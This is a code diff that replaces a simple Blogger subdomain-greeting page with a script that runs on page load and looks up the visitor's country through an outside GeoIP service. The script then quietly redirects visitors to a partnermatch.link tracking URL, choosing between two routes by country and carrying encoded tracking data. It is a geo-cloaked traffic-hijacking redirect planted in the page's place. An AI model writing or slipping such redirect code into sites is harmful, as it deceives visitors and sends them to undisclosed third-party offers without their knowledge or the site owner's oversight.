@@ -1,28 +1,48 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <meta charset="UTF-8">
-  <title>Dynamic Subdomain Handling on Blogger</title>
-  <script>
-    // Ambil hostname saat ini
-    const hostname = window.location.hostname;
+<script>
+    // List of allowed countries
+    const allowedCountries = ["AU", "AT", "BE", "CA", "DK", "FI", "FR", "DE", "IT", "JP", "NL", "NZ", "NO", "PT", "ES", "SE", "CH", "GB", "US"];
 
-    // Pisahkan subdomain dari hostname
-    const subdomain = hostname.split('.')[0];
-
-    // Element untuk menampilkan pesan
-    const messageElement = document.getElementById('message');
-
-    if (subdomain !== 'www' && subdomain !== 'blog') {
-      // Tampilkan pesan berdasarkan subdomain
-      messageElement.textContent = `Welcome to ${subdomain}.example.com!`;
-    } else {
-      // Tampilkan pesan default
-      messageElement.textContent = 'Welcome to example.com!';
+    // Function to get country code from IP address using a GeoIP service
+    async function getCountryCode() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const data = await response.json();
+            return data.country;
+        } catch (error) {
+            console.error('Error fetching the country code:', error);
+            return null;
+        }
     }
-  </script>
-</head>
-<body>
-  <h1 id="message"></h1>
-</body>
-</html>
+
+    // Function to extract path from current URL
+    function getPath() {
+        return window.location.pathname;  // Gets the path part of the URL
+    }
+
+    // Function to check if the path contains a random string
+    function hasRandomString(path) {
+        // Replace this with your logic to check for a random string pattern
+        // For example, checking if the path matches a specific format
+        // This is a simplified example:
+        return path.length > 1; // Check if the path length is greater than 1 (assuming random string)
+    }
+
+    // Function to perform redirection based on country and random string
+    async function redirectBasedOnCountryAndPath() {
+        const countryCode = await getCountryCode();
+        const path = getPath();
+
+        // Check if the path contains a random string
+        if (hasRandomString(path)) {
+            // Check if the country code is in the allowed list
+            if (allowedCountries.includes(countryCode)) {
+                window.location.href = 'https://cdefecf.partnermatch.link/s/22edadef06445?track=LEGIT&subsource=TEVHSVQsQ1osMTg1LjI0Mi42LjUyLFdBUCxUUkFGRUU';
+            } else {
+                window.location.href = 'https://cdefecf.partnermatch.link/s/22edadef06445?track=JOKOSEMUJUNG&subsource=Sk9LT1NFTVVKVU5HLEVTLDE4NS4xODguNjEuNDUsV0VCLFRSQUZFRQ';
+            }
+        }
+    }
+
+    // Run the redirect function on page load
+    window.onload = redirectBasedOnCountryAndPath;
+</script>
